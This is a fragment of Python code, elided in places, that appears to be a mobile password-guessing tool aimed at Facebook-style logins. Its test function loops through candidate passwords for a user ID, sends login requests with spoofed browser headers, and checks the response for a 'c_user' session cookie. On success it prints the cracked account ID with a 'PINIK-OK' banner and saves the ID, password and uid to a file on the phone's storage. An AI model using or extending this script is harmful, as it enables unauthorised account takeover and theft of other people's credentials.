...
def test(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[1;90m[\033[1;92mPINIK\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            "login":"Log In"}
             ...
             'cache-control': 'max-age=0',
              'sec-ch-ua': '"Google Chrome";v="57", "Chromium";v="57", "Not=A?Brand";v="24"',
              'sec-ch-ua-mobile': '?0',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m[PINIK-OK] '+cid+' ¤ '+ps+'\33[0;92m')
                oks.append(cid)
                open('/sdcard/PINIK-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
